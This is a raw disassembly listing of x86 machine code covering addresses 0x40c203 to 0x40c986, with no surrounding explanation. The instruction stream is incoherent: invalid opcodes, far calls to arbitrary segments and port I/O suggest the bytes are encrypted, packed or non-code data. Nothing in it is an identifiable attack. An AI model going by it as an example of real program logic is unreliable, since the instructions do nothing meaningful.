  40c203:	sub    ah,BYTE PTR [ebx]
  40c205:	mov    esi,esi
  40c207:	in     al,dx
  40c208:	bound  ebp,QWORD PTR [esi]
  40c20a:	in     eax,0x48
  40c20c:	mov    dl,0x96
  40c20e:	adc    al,0x1
  40c210:	sar    DWORD PTR [ecx],0x7d
  40c213:	ins    DWORD PTR es:[edi],dx
  40c214:	pop    esi
  40c215:	or     eax,DWORD PTR [ecx]
  40c217:	adc    DWORD PTR [eax+eax*2+0x25],esp
  40c21b:	jp     0x40c1ca
  40c21d:	pushf  
  40c21e:	jbe    0x40c214
  40c220:	dec    esi
  40c221:	mov    bl,0x84
  40c223:	imul   BYTE PTR [ebx]
  40c225:	daa    
  40c226:	sbb    ch,BYTE PTR [eax+0x13d64e2f]
  40c22c:	and    BYTE PTR [edi+eax*4],cl
  40c22f:	cwde   
  40c230:	mov    eax,0x927434a
  40c235:	mov    ecx,0x69b550f2
  40c23a:	and    ch,BYTE PTR [edx-0x68a52ec7]
  40c240:	int3   
  40c241:	data16 icebp 
  40c243:	test   eax,0x5266ba50
  40c248:	aad    0xec
  40c24a:	adc    dl,bh
  40c24c:	outs   dx,BYTE PTR ds:[esi]
  40c24d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c24e:	and    DWORD PTR [eax],eax
  40c250:	mov    dl,0x2a
  40c252:	sti    
  40c253:	push   edi
  40c254:	pusha  
  40c255:	and    dl,cl
  40c257:	pop    edi
  40c258:	js     0x40c265
  40c25a:	adc    ebp,ecx
  40c25c:	rcl    DWORD PTR [ebp+0x1],0xf2
  40c260:	dec    edi
  40c261:	sub    al,BYTE PTR ss:0x646d95b2
  40c268:	aam    0xad
  40c26a:	je     0x40c239
  40c26c:	xchg   ecx,eax
  40c26d:	or     edi,DWORD PTR [esi-0x4f6025a8]
  40c273:	jo     0x40c244
  40c275:	neg    BYTE PTR [ebp+0x2ca16bd2]
  40c27b:	aad    0x82
  40c27d:	rol    esi,cl
  40c27f:	sbb    eax,0xa956ef1c
  40c284:	mov    bl,0xe1
  40c286:	out    0xed,eax
  40c288:	xor    bh,BYTE PTR [ebx+0x3e5195ee]
  40c28e:	popf   
  40c28f:	or     eax,0x629e95c9
  40c294:	adc    cl,BYTE PTR [ecx-0x7a]
  40c297:	pop    ds
  40c298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c299:	or     esp,esp
  40c29b:	hlt    
  40c29c:	stos   BYTE PTR es:[edi],al
  40c29d:	bound  ecx,QWORD PTR [esi-0x11caf35f]
  40c2a3:	mov    ebp,cs
  40c2a5:	jp     0x40c296
  40c2a7:	jmp    0x40c25b
  40c2a9:	rcr    cl,1
  40c2ab:	psubusb mm7,QWORD PTR [ebp+0xba36601]
  40c2b2:	pusha  
  40c2b3:	retf   
  40c2b4:	push   eax
  40c2b5:	pop    ebp
  40c2b6:	test   BYTE PTR [ecx],dh
  40c2b8:	push   ecx
  40c2b9:	pop    ebx
  40c2ba:	mov    ah,0x3
  40c2bc:	pop    ecx
  40c2bd:	jecxz  0x40c259
  40c2bf:	push   edi
  40c2c0:	jge    0x40c2b0
  40c2c2:	and    al,0x92
  40c2c4:	push   cs
  40c2c5:	or     eax,DWORD PTR [edx-0x6]
  40c2c8:	jns    0x40c296
  40c2ca:	in     al,dx
  40c2cb:	stc    
  40c2cc:	mul    ch
  40c2ce:	call   0xa643:0xd00d46b7
  40c2d5:	dec    edx
  40c2d6:	sub    eax,0x1c00e4a9
  40c2db:	adc    esi,DWORD PTR [edx-0x241f8565]
  40c2e1:	cmp    al,0x9a
  40c2e3:	and    al,0x7e
  40c2e5:	sahf   
  40c2e6:	or     ebx,DWORD PTR [esi-0x5f]
  40c2e9:	jecxz  0x40c26b
  40c2eb:	test   al,0xdf
  40c2ed:	mov    edx,0x945d588b
  40c2f2:	mov    edx,0xf0a4bb34
  40c2f7:	lock mov dl,0xe
  40c2fa:	inc    esp
  40c2fb:	add    BYTE PTR [edi],dh
  40c2fd:	leave  
  40c2fe:	hlt    
  40c2ff:	and    eax,DWORD PTR [esp+ecx*1]
  40c302:	xchg   esi,eax
  40c303:	cmp    eax,DWORD PTR [esi+0x8]
  40c306:	ret    
  40c307:	test   edx,0x5ceef7ad
  40c30d:	aas    
  40c30e:	mov    BYTE PTR [eax-0x4],0xb
  40c312:	stc    
  40c313:	int    0x52
  40c315:	jbe    0x40c29d
  40c317:	sbb    eax,0xea0c0b9e
  40c31c:	cmc    
  40c31d:	mov    edx,0xf72085a5
  40c322:	call   0x8af8:0x298a5960
  40c329:	ss inc ebx
  40c32b:	add    DWORD PTR [ecx-0x65],0x74da742
  40c332:	and    dl,BYTE PTR [edi]
  40c334:	clc    
  40c335:	jb     0x40c2d1
  40c337:	ss daa 
  40c339:	mov    dh,0xe8
  40c33b:	cmp    eax,DWORD PTR [ebx-0x6aae85ef]
  40c341:	adc    al,0x7f
  40c343:	out    0x3d,al
  40c345:	mov    ecx,edi
  40c347:	aam    0x6a
  40c349:	pop    esp
  40c34a:	mov    cs,edx
  40c34c:	push   edx
  40c34d:	add    eax,DWORD PTR [ebp+0x5122869d]
  40c353:	cmp    DWORD PTR [eax-0x75],0xffffffe6
  40c357:	xchg   esi,eax
  40c358:	les    esp,FWORD PTR [edx+0x535ba739]
  40c35e:	jb     0x40c3a0
  40c360:	daa    
  40c361:	cld    
  40c362:	dec    BYTE PTR [edi]
  40c364:	mov    dl,0x31
  40c366:	cmp    ch,ah
  40c368:	pushf  
  40c369:	jl     0x40c346
  40c36b:	mov    eax,ds:0x31000ba7
  40c370:	xchg   dh,dh
  40c372:	adc    edx,esi
  40c374:	popa   
  40c375:	shl    BYTE PTR [ebx-0x39f45686],cl
  40c37b:	(bad)  
  40c37c:	sub    bh,BYTE PTR [ebx+edi*2-0x58f435b6]
  40c383:	push   ebp
  40c384:	pop    ebx
  40c385:	outs   dx,DWORD PTR ds:[esi]
  40c386:	es fwait
  40c388:	sub    edi,DWORD PTR [ebx]
  40c38a:	call   0xae2f:0x7a160678
  40c391:	adc    eax,0x5b34a904
  40c396:	popf   
  40c397:	mov    eax,0x375e4412
  40c39c:	and    esp,DWORD PTR [edi-0x2e]
  40c39f:	push   ecx
  40c3a0:	mov    edx,0xb45b970b
  40c3a5:	mov    esi,0xbdd7be7
  40c3aa:	xchg   DWORD PTR [edi],esp
  40c3ac:	leave  
  40c3ad:	dec    eax
  40c3ae:	sar    BYTE PTR [edi*8+0x760f9562],0x3
  40c3b6:	into   
  40c3b7:	fsubr  QWORD PTR [si]
  40c3ba:	fwait
  40c3bb:	mov    eax,ds:0x3efa0e4e
  40c3c0:	(bad)  
  40c3c1:	lea    edx,[ebx-0x59]
  40c3c4:	sbb    DWORD PTR [esi+0x1cab36db],edx
  40c3ca:	call   0xfc6d:0xcd060068
  40c3d1:	mov    ebx,0x1512a706
  40c3d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3d7:	lahf   
  40c3d8:	cmp    dh,BYTE PTR [edi]
  40c3da:	outs   dx,BYTE PTR ds:[esi]
  40c3db:	mov    al,ds:0xa8fea8b2
  40c3e0:	mov    cl,0xed
  40c3e2:	sbb    eax,0xd0ab474
  40c3e7:	mov    BYTE PTR [ebp+0x70],0xea
  40c3eb:	mov    cl,0x3c
  40c3ed:	jmp    0x40c3bb
  40c3ef:	jg     0x40c39e
  40c3f1:	dec    esi
  40c3f2:	dec    eax
  40c3f3:	xor    DWORD PTR [edx+0x28],esi
  40c3f6:	sbb    ecx,esp
  40c3f8:	outs   dx,DWORD PTR ds:[esi]
  40c3f9:	push   ebx
  40c3fa:	outs   dx,DWORD PTR ds:[esi]
  40c3fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3fc:	jae    0x40c411
  40c3fe:	xchg   edx,eax
  40c3ff:	sbb    eax,0x4e9fde71
  40c404:	mov    dl,0x4f
  40c406:	and    eax,0x181542d6
  40c40b:	cdq    
  40c40c:	push   edx
  40c40d:	or     ecx,DWORD PTR [edi+ebp*8-0x3c]
  40c411:	sbb    ah,bl
  40c413:	inc    ecx
  40c414:	add    al,0x33
  40c416:	mov    al,ds:0xe5b33b1b
  40c41b:	fnstcw WORD PTR [ebp+0x453348b6]
  40c421:	sub    ecx,DWORD PTR [esi-0x1bafb86d]
  40c427:	mov    edx,0xe771fddb
  40c42c:	pop    es
  40c42d:	rcr    eax,0x8
  40c430:	std    
  40c431:	out    dx,al
  40c432:	call   0xc109:0x3bff7e04
  40c439:	(bad)  
  40c43a:	push   edx
  40c43b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c43c:	xor    bl,ch
  40c43e:	test   DWORD PTR [edx],edi
  40c440:	ret    
  40c441:	xchg   ebx,eax
  40c442:	scas   al,BYTE PTR es:[edi]
  40c443:	inc    ebx
  40c444:	xor    DWORD PTR [ecx],eax
  40c446:	call   0x8d96:0xc1214cb9
  40c44d:	pop    ecx
  40c44e:	mov    al,ds:0x92cb39a4
  40c453:	ins    BYTE PTR es:[edi],dx
  40c454:	les    esp,FWORD PTR [edx+edi*2-0x65fab7b3]
  40c45b:	(bad)  
  40c45c:	hlt    
  40c45d:	jp     0x40c4a6
  40c45f:	sbb    DWORD PTR [ebp-0x3e5b3ef3],edx
  40c465:	adc    BYTE PTR [esi-0x18],dh
  40c468:	ficomp WORD PTR [eax-0x48b41fe]
  40c46e:	call   0xb15f:0x44bad51d
  40c475:	sub    dl,BYTE PTR [eax]
  40c477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c478:	adc    dl,bl
  40c47a:	and    ah,BYTE PTR [esi+0x44]
  40c47d:	xor    edi,DWORD PTR [edx+eiz*8-0x4e]
  40c481:	leave  
  40c482:	aad    0x53
  40c484:	pushf  
  40c485:	sbb    al,0x2d
  40c487:	std    
  40c488:	pop    ds
  40c489:	or     ecx,DWORD PTR [edx]
  40c48b:	dec    edx
  40c48c:	scas   eax,DWORD PTR es:[edi]
  40c48d:	jbe    0x40c4a2
  40c48f:	xchg   edx,eax
  40c490:	dec    esp
  40c491:	ret    
  40c492:	mov    dl,0xaa
  40c494:	lods   al,BYTE PTR ds:[esi]
  40c495:	mov    DWORD PTR [eax+0x77],ebp
  40c498:	mov    bl,0x77
  40c49a:	and    al,0x96
  40c49c:	xchg   esi,eax
  40c49d:	pop    ecx
  40c49e:	inc    eax
  40c49f:	push   ebx
  40c4a0:	xchg   edx,eax
  40c4a1:	push   esi
  40c4a2:	out    dx,eax
  40c4a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4a4:	add    BYTE PTR [ebp-0x61],dh
  40c4a7:	sbb    edx,eax
  40c4a9:	adc    al,0x5a
  40c4ab:	ss mov dl,0xa6
  40c4ae:	mov    esp,0x835911d3
  40c4b3:	lods   al,BYTE PTR ds:[esi]
  40c4b4:	gs loope 0x40c49f
  40c4b7:	mov    DWORD PTR [esi+0x78a710d0],esp
  40c4bd:	mov    ebp,0x6efb82e1
  40c4c2:	xchg   eax,esi
  40c4c4:	cwde   
  40c4c5:	jmp    0x8a4b6c6d
  40c4ca:	xor    edi,DWORD PTR [eax-0x6]
  40c4cd:	cdq    
  40c4ce:	ins    BYTE PTR es:[edi],dx
  40c4cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4d0:	cmp    ecx,DWORD PTR [ebx+0x242e416a]
  40c4d6:	xchg   edi,eax
  40c4d7:	push   DWORD PTR [ecx-0x773bc6f3]
  40c4dd:	scas   eax,DWORD PTR es:[edi]
  40c4de:	dec    ecx
  40c4df:	jg     0x40c4b0
  40c4e1:	loope  0x40c562
  40c4e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4e4:	daa    
  40c4e5:	ins    DWORD PTR es:[edi],dx
  40c4e6:	mov    cs,WORD PTR [ebp+esi*2-0x8]
  40c4ea:	jmp    0x40c4de
  40c4ec:	mov    WORD PTR [edx],cs
  40c4ee:	retf   
  40c4ef:	mov    al,ds:0xbd4ad555
  40c4f4:	add    bl,dl
  40c4f6:	ds sar DWORD PTR ss:[edi-0x12],cl
  40c4fb:	sti    
  40c4fc:	cmp    bl,ah
  40c4fe:	cwde   
  40c4ff:	lock call 0xd277eb27
  40c505:	xchg   BYTE PTR [esi+0x696e5824],ch
  40c50b:	(bad)  
  40c50c:	cli    
  40c50d:	adc    al,0x9a
  40c50f:	(bad)  
  40c510:	push   esi
  40c511:	and    DWORD PTR [ecx],ebp
  40c513:	sbb    ebx,edi
  40c515:	xchg   edx,eax
  40c516:	mov    WORD PTR [edi-0x312f6b45],fs
  40c51c:	add    BYTE PTR [esi],0x3a
  40c51f:	leave  
  40c520:	scas   al,BYTE PTR es:[edi]
  40c521:	rol    BYTE PTR cs:[ebp+0x72],0x19
  40c526:	push   es
  40c527:	push   cs
  40c528:	cmp    eax,0xf9a78f80
  40c52d:	loope  0x40c5a0
  40c52f:	das    
  40c530:	xchg   DWORD PTR [eax+0x21],esp
  40c533:	shl    BYTE PTR [edx-0xcb0790],1
  40c539:	cmp    esi,edi
  40c53b:	es xchg ebx,eax
  40c53d:	jmp    0x72806c58
  40c542:	les    eax,FWORD PTR es:[esi+edx*4+0x2c]
  40c547:	pop    esp
  40c548:	mov    dl,0xca
  40c54a:	idiv   BYTE PTR [ecx+0x2740fe1e]
  40c550:	push   esp
  40c551:	or     BYTE PTR [ebx-0x13],cl
  40c554:	gs dec esi
  40c556:	aaa    
  40c557:	test   al,0x2
  40c559:	inc    edi
  40c55a:	or     al,0x37
  40c55c:	mov    dl,0x2f
  40c55e:	test   al,0xf8
  40c560:	sbb    WORD PTR ds:0x360bc0be,cx
  40c567:	xchg   dh,cl
  40c569:	jl     0x40c5e6
  40c56b:	push   ecx
  40c56c:	cmp    eax,0x38249511
  40c571:	xor    bl,0x58
  40c574:	mov    dl,0x91
  40c576:	mov    eax,0x3894ec99
  40c57b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c57c:	mov    ah,BYTE PTR [edi+0x78330802]
  40c582:	mov    DWORD PTR [eax-0x51563b53],eax
  40c588:	mov    dl,0xfa
  40c58a:	cs loopne 0x40c5a7
  40c58d:	mov    eax,0x10dda75e
  40c592:	dec    ecx
  40c593:	xchg   ecx,eax
  40c594:	cli    
  40c595:	and    BYTE PTR [ecx+0x57ccb249],dl
  40c59b:	daa    
  40c59c:	mov    bh,0xe9
  40c59e:	sbb    ebx,DWORD PTR [esi]
  40c5a0:	xchg   BYTE PTR [ebx],cl
  40c5a2:	dec    esp
  40c5a3:	lea    esi,[esi-0x80]
  40c5a6:	cli    
  40c5a7:	jb     0x40c53a
  40c5a9:	pop    ebp
  40c5aa:	js     0x40c5cf
  40c5ac:	mov    dl,0xc3
  40c5ae:	idiv   BYTE PTR [ebx]
  40c5b0:	lahf   
  40c5b1:	aad    0x54
  40c5b3:	pop    edi
  40c5b4:	int3   
  40c5b5:	or     BYTE PTR [edx+ebp*2],dh
  40c5b8:	mov    bh,0x13
  40c5ba:	fucomi st,st(0)
  40c5bc:	or     dl,BYTE PTR [edi]
  40c5be:	pop    es
  40c5bf:	xor    DWORD PTR [edx+0x545ddefc],0x5d
  40c5c6:	cmp    ebx,ecx
  40c5c8:	or     BYTE PTR [ebx],0xe2
  40c5cb:	mov    cl,0xa5
  40c5cd:	xor    al,0xef
  40c5cf:	iret   
  40c5d0:	push   0xf0f29abf
  40c5d5:	xor    BYTE PTR [eax+ecx*4+0x6e],dl
  40c5d9:	xchg   esi,eax
  40c5da:	jne    0x40c583
  40c5dc:	mov    eax,ds:0xaadf83db
  40c5e1:	mov    DWORD PTR [edx],0x6464b24d
  40c5e7:	call   0xcb5:0x3cbed6b7
  40c5ee:	mov    edx,?
  40c5f0:	jg     0x40c576
  40c5f2:	inc    BYTE PTR [edi+0x34653a93]
  40c5f8:	mov    dl,0x94
  40c5fa:	xlat   BYTE PTR ds:[ebx]
  40c5fb:	mov    ds:0x3ba8ddf8,al
  40c600:	or     BYTE PTR [ebx],cl
  40c602:	dec    edi
  40c603:	call   0xcb8d:0x4cf8c76a
  40c60a:	call   0x562d:0xc87ea94e
  40c611:	mov    cs,WORD PTR [esi]
  40c613:	mov    al,ds:0x95a95044
  40c618:	sub    BYTE PTR [ebx-0x4f],0xe9
  40c61c:	mov    bl,0xec
  40c61e:	call   0xb019:0x4ebb51d7
  40c625:	loop   0x40c60f
  40c627:	pop    edi
  40c628:	fdiv   st,st(2)
  40c62a:	mov    edx,0x890bf5ad
  40c62f:	ror    bh,0x75
  40c632:	push   edx
  40c633:	sahf   
  40c634:	cmp    BYTE PTR ds:0x87a7b1b4,ch
  40c63a:	sahf   
  40c63b:	mov    bl,0x63
  40c63d:	aad    0x5a
  40c63f:	shl    ch,0x99
  40c642:	cmp    ah,BYTE PTR [edi+0x2af92969]
  40c648:	fsubr  DWORD PTR [edi-0x4005e85f]
  40c64e:	loop   0x40c5f3
  40c650:	push   esi
  40c651:	pop    ecx
  40c652:	lahf   
  40c653:	cmp    eax,0x1a348272
  40c658:	sbb    eax,0x96a0c30b
  40c65d:	movd   mm0,DWORD PTR [eax]
  40c660:	dec    eax
  40c661:	mov    al,0x86
  40c663:	loope  0x40c6a4
  40c665:	in     al,0x9b
  40c667:	jbe    0x40c620
  40c669:	adc    eax,0xd552d91d
  40c66e:	mov    esi,0xf0e205a7
  40c673:	add    DWORD PTR [ebx-0x43],0x39b4c479
  40c67a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c67b:	cmp    esi,DWORD PTR [ebx+0x4aa7a0f9]
  40c681:	fistp  QWORD PTR [edx-0x284cfc30]
  40c687:	mov    bl,0xbc
  40c689:	pop    ebx
  40c68a:	into   
  40c68b:	aas    
  40c68c:	sub    al,0x6b
  40c68e:	or     al,0xe8
  40c690:	into   
  40c691:	sub    al,0x40
  40c693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c694:	dec    edx
  40c695:	push   DWORD PTR [esi+edx*1-0x36]
  40c699:	mov    cs,WORD PTR [edi-0x20]
  40c69c:	scas   eax,DWORD PTR es:[edi]
  40c69d:	sti    
  40c69e:	imul   BYTE PTR [esi]
  40c6a0:	repnz shl BYTE PTR [ecx+0x43],cl
  40c6a4:	inc    esp
  40c6a5:	retf   
  40c6a6:	fisub  WORD PTR [edi-0x322f0694]
  40c6ac:	js     0x40c6ae
  40c6ae:	jnp    0x40c6bc
  40c6b0:	mov    dl,0xec
  40c6b2:	cmp    al,0xd
  40c6b4:	mov    eax,ds:0xc0c51b0d
  40c6b9:	js     0x40c6b8
  40c6bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6bc:	add    ah,BYTE PTR [edx+0x3399c1d5]
  40c6c2:	sbb    DWORD PTR [ecx],eax
  40c6c4:	inc    esp
  40c6c5:	add    BYTE PTR [ebp-0x4c7bb6d0],ah
  40c6cb:	dec    esp
  40c6cc:	jns    0x40c6e4
  40c6ce:	sbb    ah,BYTE PTR [esi-0x5f760043]
  40c6d4:	(bad)  
  40c6d5:	repz xchg esi,eax
  40c6d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6d8:	mov    ds:0xd4940ba1,eax
  40c6dd:	iret   
  40c6de:	push   edx
  40c6df:	add    dl,0x5b
  40c6e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6e3:	bound  esi,QWORD PTR [eax]
  40c6e5:	mov    WORD PTR [ecx-0x5],cs
  40c6e8:	stos   DWORD PTR es:[edi],eax
  40c6e9:	test   BYTE PTR [edx],bl
  40c6eb:	jp     0x40c702
  40c6ed:	fs jne 0x40c697
  40c6f0:	cdq    
  40c6f1:	dec    ecx
  40c6f2:	test   DWORD PTR [ebp+0xb82393e],0x3d5afab2
  40c6fc:	jmp    0x40c71d
  40c6fe:	(bad)  
  40c6ff:	dec    ebx
  40c700:	or     DWORD PTR ds:0xc4b22414,esi
  40c706:	das    
  40c707:	dec    eax
  40c708:	pop    esp
  40c709:	mov    eax,0x1bb5bd2d
  40c70e:	and    eax,0x4ac57ad3
  40c713:	(bad)  
  40c714:	aam    0x5c
  40c716:	jp     0x40c6bf
  40c718:	dec    esp
  40c719:	push   eax
  40c71a:	rcl    esp,cl
  40c71c:	scas   eax,DWORD PTR es:[edi]
  40c71d:	inc    esi
  40c71e:	in     al,dx
  40c71f:	stos   DWORD PTR es:[edi],eax
  40c720:	(bad)  
  40c721:	sub    dh,BYTE PTR [ecx-0x2e]
  40c724:	mov    dl,0xe6
  40c726:	in     eax,dx
  40c727:	popa   
  40c728:	xor    bl,BYTE PTR [edx]
  40c72a:	mov    al,ds:0x6a0bb3e7
  40c72f:	add    dl,BYTE PTR [ecx+0x48]
  40c732:	call   FWORD PTR [ecx+0x199a3ed6]
  40c738:	popa   
  40c739:	out    0x5e,al
  40c73b:	cwde   
  40c73c:	sub    eax,0xfcd18f98
  40c741:	push   cs
  40c742:	sbb    edx,DWORD PTR [edx]
  40c744:	mov    esp,0x7a275c90
  40c749:	sub    ebx,ebx
  40c74b:	mov    cl,0x2
  40c74d:	dec    esi
  40c74e:	mov    DWORD PTR [ebp+edx*2+0x7e],edx
  40c752:	call   0x454d:0xc2a495c4
  40c759:	xor    al,0x81
  40c75b:	and    DWORD PTR [ecx+0xb],eax
  40c75e:	je     0x40c79b
  40c760:	mov    esp,DWORD PTR [esi]
  40c762:	mov    eax,ds:0x9a43b5c7
  40c767:	mov    eax,0x89caa690
  40c76c:	add    eax,0x81da9516
  40c771:	or     BYTE PTR [edx+0x28],ch
  40c774:	ss mov ecx,esp
  40c777:	mov    edi,0x9b218b7d
  40c77c:	js     0x40c795
  40c77e:	call   0x8224:0xcf5a22e2
  40c785:	iret   
  40c786:	bound  esp,QWORD PTR [edi-0x163b49dd]
  40c78c:	pop    ebp
  40c78d:	out    0xda,eax
  40c78f:	mov    dl,0xc9
  40c791:	les    edi,FWORD PTR [ebp+0x61fda8b1]
  40c797:	mov    ds:0x274cb38a,eax
  40c79c:	cmovbe eax,DWORD PTR [esi+ebp*8+0x28b4a48f]
  40c7a4:	jno    0x40c7fa
  40c7a6:	adc    al,0xa7
  40c7a8:	popf   
  40c7a9:	inc    ebx
  40c7aa:	lods   eax,DWORD PTR ds:[esi]
  40c7ab:	in     eax,dx
  40c7ac:	pop    ecx
  40c7ad:	or     BYTE PTR [esp+edx*2+0x65],dl
  40c7b1:	pop    ds
  40c7b2:	sub    eax,0xf342633d
  40c7b7:	addr16 mov al,ds:0x9ac4
  40c7bb:	jl     0x40c7fa
  40c7bd:	frstorw [edx-0x5ffb353b]
  40c7c4:	lahf   
  40c7c5:	jo     0x40c7ee
  40c7c7:	dec    edx
  40c7c8:	ja     0x40c835
  40c7ca:	gs cli 
  40c7cc:	loop   0x40c7ef
  40c7ce:	call   0x59d4:0x926f16f6
  40c7d5:	jb     0x40c7ef
  40c7d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7d8:	and    DWORD PTR [esi+0x6],ebp
  40c7db:	repnz leave 
  40c7dd:	out    dx,al
  40c7de:	mov    esp,0x2ef5b2f9
  40c7e3:	dec    edx
  40c7e4:	es ja  0x40c78a
  40c7e7:	add    al,0x3b
  40c7e9:	or     bh,ah
  40c7eb:	enter  0x31a0,0xff
  40c7ef:	and    eax,edx
  40c7f1:	call   FWORD PTR [ebp+ecx*4-0x36f7534e]
  40c7f8:	push   ebx
  40c7f9:	retf   0x18fd
  40c7fc:	inc    ebx
  40c7fd:	or     esi,DWORD PTR [edx]
  40c7ff:	iret   
  40c800:	into   
  40c801:	stos   DWORD PTR es:[edi],eax
  40c802:	enter  0xb6f2,0x1c
  40c806:	call   0xa7bd:0x9870fcfc
  40c80d:	je     0x40c79b
  40c80f:	mov    cl,0xd9
  40c811:	jle    0x40c87b
  40c813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c814:	and    eax,0x431f16c3
  40c819:	mov    ebx,0x88735395
  40c81e:	int3   
  40c81f:	xchg   DWORD PTR [ebx],ecx
  40c821:	sahf   
  40c822:	sub    DWORD PTR [ebp+0x26ae0b18],ecx
  40c828:	arpl   WORD PTR [esi+0x2781924e],ax
  40c82e:	fwait
  40c82f:	fwait
  40c830:	xchg   DWORD PTR fs:[ebx+0x4ad55fee],esp
  40c837:	cmp    ah,BYTE PTR [ebp-0x58620300]
  40c83d:	test   BYTE PTR [edx-0x12ec996b],bl
  40c843:	mov    dh,BYTE PTR [edx+0x1c0c2d5c]
  40c849:	push   edi
  40c84a:	das    
  40c84b:	out    dx,al
  40c84c:	pop    ss
  40c84d:	or     esp,DWORD PTR [ebp+ebp*1-0x51]
  40c851:	aad    0x80
  40c853:	ins    DWORD PTR es:[edi],dx
  40c854:	add    esi,DWORD PTR [edi+0x2bb4239a]
  40c85a:	mov    bl,0x1
  40c85c:	jb     0x40c8d1
  40c85e:	dec    esp
  40c85f:	fcom   DWORD PTR [eax+0x4bd42f0b]
  40c865:	addr16 cwde 
  40c867:	adc    eax,0x99ac728
  40c86c:	repnz mov dh,0x13
  40c86f:	xor    BYTE PTR [edi],bl
  40c871:	jp     0x40c82f
  40c873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c874:	sbb    edi,DWORD PTR [eax+0x20]
  40c877:	mov    ds:0xa1b3f3b8,al
  40c87c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c87d:	pop    ss
  40c87e:	mov    dh,0xa4
  40c880:	mov    bh,0x33
  40c882:	xchg   esp,eax
  40c883:	fnstenv [edx]
  40c885:	rol    DWORD PTR [edi],1
  40c887:	xchg   BYTE PTR [ebx+0x15],ah
  40c88a:	and    al,ch
  40c88c:	xchg   ebx,ecx
  40c88e:	pop    ecx
  40c88f:	mov    ch,0x68
  40c891:	data16 jae 0x40c85d
  40c894:	lea    edi,[ecx]
  40c896:	push   ebx
  40c897:	es jmp 0x40c8a8
  40c89a:	out    dx,eax
  40c89b:	pusha  
  40c89c:	jle    0x40c8bf
  40c89e:	jp     0x40c849
  40c8a0:	aaa    
  40c8a1:	bnd jb 0x40c890
  40c8a4:	dec    edx
  40c8a5:	or     ah,ch
  40c8a7:	pop    ecx
  40c8a8:	add    edx,DWORD PTR [esp+ebp*4-0x581cc263]
  40c8af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8b0:	mov    bl,0xc3
  40c8b2:	(bad)  
  40c8b3:	fisttp WORD PTR [esi]
  40c8b5:	jns    0x40c904
  40c8b7:	and    dl,dl
  40c8b9:	int    0x45
  40c8bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8bc:	outs   dx,DWORD PTR ds:[esi]
  40c8bd:	pop    es
  40c8be:	cmp    DWORD PTR [esi+0x3d159667],ebp
  40c8c4:	push   edx
  40c8c5:	push   edi
  40c8c6:	jns    0x40c937
  40c8c8:	mov    ch,0x55
  40c8ca:	loope  0x40c920
  40c8cc:	push   edx
  40c8cd:	sbb    BYTE PTR [edx+0x33e084c6],bl
  40c8d3:	(bad)  
  40c8d4:	fdiv   QWORD PTR ss:[edi+eiz*4]
  40c8d8:	idiv   DWORD PTR [ebx-0x7c]
  40c8db:	inc    edx
  40c8dc:	ror    BYTE PTR [esi+0x55a11d05],0x6d
  40c8e3:	push   es
  40c8e4:	mov    dl,0xa6
  40c8e6:	inc    esi
  40c8e7:	mov    cl,0x75
  40c8e9:	mov    eax,ds:0xcdf1a796
  40c8ee:	or     eax,0xab699437
  40c8f3:	sbb    BYTE PTR [edi-0x161404ff],dh
  40c8f9:	aam    0x5a
  40c8fb:	mov    ds:0xa7fd4013,eax
  40c900:	in     al,0x88
  40c902:	out    dx,al
  40c903:	xor    al,0xc8
  40c905:	call   0xb0fb:0x45b2bc78
  40c90c:	pop    DWORD PTR [ecx]
  40c90e:	push   0x497c57ab
  40c913:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c914:	sbb    ecx,0x6a
  40c917:	or     dh,BYTE PTR [edi-0x4d66eb74]
  40c91d:	femms  
  40c91f:	int    0x66
  40c921:	pop    edi
  40c922:	dec    esp
  40c923:	popf   
  40c924:	ss or  edi,edx
  40c927:	inc    esp
  40c928:	push   cs
  40c929:	sar    BYTE PTR [edi-0x65525188],cl
  40c92f:	lahf   
  40c930:	sti    
  40c931:	test   BYTE PTR [ecx],al
  40c933:	and    dh,BYTE PTR cs:[ecx+0x6e]
  40c937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c938:	xchg   ebp,eax
  40c939:	jge    0x40c8cf
  40c93b:	call   0x9c533d9c
  40c940:	mov    ds:0x706a84f3,eax
  40c945:	imul   ebx,DWORD PTR [edx],0x69
  40c948:	sbb    eax,DWORD PTR [ebp-0x64c7abe1]
  40c94e:	or     BYTE PTR [edi-0x2d0fc996],ah
  40c954:	lods   eax,DWORD PTR ds:[esi]
  40c955:	mov    edx,0x4db2ae48
  40c95a:	dec    esp
  40c95b:	inc    ebp
  40c95c:	rcl    eax,cl
  40c95e:	push   es
  40c95f:	pop    edi
  40c960:	inc    ebp
  40c961:	or     cl,BYTE PTR [edx-0x12]
  40c964:	aam    0xc2
  40c966:	jp     0x40c999
  40c968:	stos   DWORD PTR es:[edi],eax
  40c969:	repz sub al,0x19
  40c96c:	mov    dl,0x3d
  40c96e:	loop   0x40c91f
  40c970:	loop   0x40c9e1
  40c972:	adc    DWORD PTR [ecx-0x20768966],ebp
  40c978:	push   edi
  40c979:	or     ecx,DWORD PTR [ebx+0x26]
  40c97c:	jmp    0x6263:0xb469308e
  40c983:	(bad)  
  40c984:	mov    dl,0x19
  40c986:	and    eax,0x5221a981
